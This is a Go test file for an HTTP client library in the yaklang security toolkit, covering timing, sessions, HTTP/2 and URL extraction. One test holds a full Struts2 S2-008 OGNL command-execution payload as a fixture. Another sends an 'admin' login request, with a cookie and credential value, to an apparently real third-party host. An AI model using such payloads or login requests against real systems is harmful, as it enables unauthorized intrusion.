package lowhttp

import (
	"bytes"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"

	_ "github.com/yaklang/yaklang/common/utils/tlsutils"
)

func TestLowhttpResponse2(t *testing.T) {
	host, port, _ := utils.ParseStringToHostPort("https://pie.dev")
	packet := `GET /delay/2 HTTP/1.1
Host: ` + utils.HostPort(host, port)

	response, err := HTTPWithoutRedirect(
		WithPacketBytes([]byte(packet)), WithHttps(true))
	if err != nil {
		log.Error(err)
		t.Fatal("BUG: httptest server failed")
	}

	rsp := response.RawPacket
	if !bytes.HasPrefix(rsp, []byte("HTTP/")) {
		t.Fatalf("Response not startswith 'HTTP/': %s", string(rsp))
	}
	if !bytes.Contains(rsp, []byte("200 OK")) {
		t.Fatalf("Response statuscode != 200: %s", string(rsp))
	}
	serverTime := response.TraceInfo.ServerTime
	if serverTime >= 2000*time.Millisecond {
		t.Logf("ConnectionTime: %s", response.TraceInfo.ConnTime)
		t.Logf("ServerTime: %s", serverTime)
		t.Logf("TotalTime: %s", response.TraceInfo.TotalTime)
		t.Logf("Response: %s", string(rsp))
	} else {
		t.Fatalf("ServerTime in 2 to 2.5s: %s", response.TraceInfo.ServerTime)
	}
}

func TestLowhttpResponse(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		time.Sleep(1 * time.Second)
		writer.Write([]byte("hello"))
	}))
	time.Sleep(time.Second)

	host, port, _ := utils.ParseStringToHostPort(server.URL)
	packet := `GET / HTTP/1.1
Host: ` + utils.HostPort(host, port)

	start := time.Now()
	response, err := HTTPWithoutRedirect(
		WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithHttps(true))
	if err != nil {
		log.Error(err)
		t.Fatal("BUG: httptest server failed")
	}
	totalTime := time.Since(start)

	rsp := response.RawPacket
	if !bytes.Contains(rsp, []byte("hello")) {
		t.Fatalf("Response != 'hello': %s", string(rsp))
	}
	serverTime := response.TraceInfo.ServerTime

	if serverTime >= 1000*time.Millisecond && serverTime <= 1100*time.Millisecond {
		t.Logf("ConnectionTime: %s", response.TraceInfo.ConnTime)
		t.Logf("ServerTime: %s", serverTime)
		t.Logf("TotalTime: %s", totalTime)
	} else {
		t.Fatalf("ServerTime in 1 to 1.1s: %s", response.TraceInfo.ServerTime)
	}
}

func TestPocSession(t *testing.T) {
	server := httptest.NewTLSServer(http.HandlerFunc(func(writer http.ResponseWriter, request *http.Request) {
		header := writer.Header()
		if strings.Contains(request.URL.String(), "name1/value1") {
			header.Add("Set-Cookie", "name1=value1")
		}
	}))
	time.Sleep(time.Second)

	host, port, _ := utils.ParseStringToHostPort(server.URL)
	packet := `GET /cookies/set/name1/value1 HTTP/1.1
Host: ` + utils.HostPort(host, port)

	// same session
	response, err := HTTPWithoutRedirect(
		WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithHttps(true), WithSession("test"))
	rsp := response.RawPacket
	if err != nil {
		log.Error(err)
		panic("BUG: httptest server failed")
	}

	if !strings.Contains(string(rsp), "Set-Cookie:") {
		panic("No Cookie Set")
	}

	// check request
	var req []byte
	response, err = HTTP(
		WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithHttps(true), WithSession("test"),
		WithBeforeDoRequest(func(bytes []byte) []byte {
			req = bytes
			return bytes
		}),
	)
	rsp = response.RawPacket

	if err != nil {
		panic("BUG: httptest server failed")
	}
	println(string(req))
	if !strings.Contains(string(req), "name1=value1") {
		panic("request no cookie name1=value1")
	}

	// check request
	response, err = HTTP(
		WithPacketBytes([]byte(packet)), WithTimeout(5*time.Second), WithHttps(true), WithSession("abc"),
		WithBeforeDoRequest(func(bytes []byte) []byte {
			req = bytes
			return bytes
		}),
	)
	rsp = response.RawPacket

	if err != nil {
		panic("BUG: httptest server failed")
	}
	println(string(req))
	if strings.Contains(string(req), "name1=value1") {
		panic("request(session test1) has cookie name1=value1")
	}
}

func TestPoCS2008(t *testing.T) {
	req := FixHTTPPacketCRLF([]byte(`GET /devmode.action?debug=command&expression=%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char[50000]%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close() HTTP/1.1
Host: cybertunnel.run:8080
`), false)
	url, err := ExtractURLFromHTTPRequestRaw(req, false)
	if err != nil {
		panic(err)
	}
	if url.String() != "http://cybertunnel.run:8080/devmode.action?debug=command&expression=%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char[50000]%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()" {
		panic(1)
	}
}

func TestPoCH2(t *testing.T) {
	addr := utils.HostPort("127.0.0.1", utils.GetRandomAvailableTCPPort())
	var buf bytes.Buffer
	go func() {
		lis, err := net.Listen("tcp", addr)
		if err != nil {
			panic(err)
		}
		conn, err := lis.Accept()
		if err != nil {
			return
		}
		go func() {
			select {
			case <-time.After(500 * time.Millisecond):
				conn.Close()
			}
		}()
		io.Copy(&buf, conn)
	}()
	time.Sleep(500 * time.Millisecond)
	nConn, err := net.Dial("tcp", addr)
	if err != nil {
		panic(err)
	}
	HTTPRequestToHTTP2("https", addr, nConn, []byte(`GET / HTTP/2.0
Host: www.example.com
User-Agent: adsfhasdhjksddjklakospdf


asdfijkoasdfjkasdf
dfasdfasdf
asd
fa
sdf
asd
f
asdf
asd`), false)
	if !strings.HasPrefix(buf.String(), `PRI * HTTP/2.0`) && len(buf.String()) > 120 {
		panic("HTTP2 not ready")
	}
}

func TestLowhttpTraceInfo_GetServerDurationMS(t *testing.T) {
	server, port := utils.DebugMockHTTP([]byte(`HTTP/1.1 200 OK
Content-Length: 11

asdfas
dfa
sdf
asdf
asdf`))
	_ = server
	rsp, err := HTTP(
		WithPacketBytes([]byte(`GET / HTTP/1.1
Host: www.baidu.com

`)), WithETCHosts(map[string]string{"www.baidu.com": "127.0.0.1"}), WithPort(port))
	if err != nil {
		panic(err)
	}
	_ = rsp
	if !bytes.Contains(rsp.RawPacket, []byte("dfa")) {
		panic(1)
	}

	rsp, err = HTTP(
		WithPacketBytes([]byte(`GET / HTTP/1.1
Host: ccc

`)), WithETCHosts(map[string]string{"www.baidu.com": "127.0.0.1", "ccc": "127.0.0.1"}), WithPort(port))
	if err != nil {
		panic(err)
	}
	_ = rsp
	if !bytes.Contains(rsp.RawPacket, []byte("dfa")) {
		panic(1)
	}
}

func TestPoCHTTP(t *testing.T) {
	HTTP(WithPacketBytes([]byte(`POST /login HTTP/1.1
Host: oa.fslawyer.org.cn:82
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=MjFmMDI5MDgtZDAyZi00ZDc0LWFlM2YtMzUxY2U2MDJlNmY4
Origin: http://oa.fslawyer.org.cn:82
Referer: http://oa.fslawyer.org.cn:82/login.jsp?$=deny
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Length: 474

_csrf=09b1080a-f5f1-4ca1-b9d6-d8c15833db99&username=admin&password=refL8mVwXqFvgDOef%2F%2BSqMqv2aPTg5J%2BSFa2Om1m4QR7Fm86l4WrJnjc4yQEMvYvr97EzQ%2F7CBIqnwsx9NTnvkbPhf%2BdOnVN9A7T9bts2dvjbUb5jkEdEECYKQB7VQRZMxvmVu3qUisim2YaJO8Qc66TtNpvcFqH39bHEZOUn6Cb9f2q%2FgHMwMAUY36xidNj8y4jyFl9NcBL6fvgmraxwp2scbDNNX19utwmn3brGJP3b6HlqZdYIm4FA%2FE7wMg0t02iN7tpXnvxgpVEu7Ze6bCpTH4KIfMtR49%2FcwQ%2BQUtpG%2FgD6l2OrXuJNL1sHDAfBugrK9l6paMb%2F70GlZQEkQ%3D%3D%3A%3A%3AAIiG74Mxr6367FyB0XHOiA%3D%3D`)), WithRedirectTimes(10), WithJsRedirect(true))
}
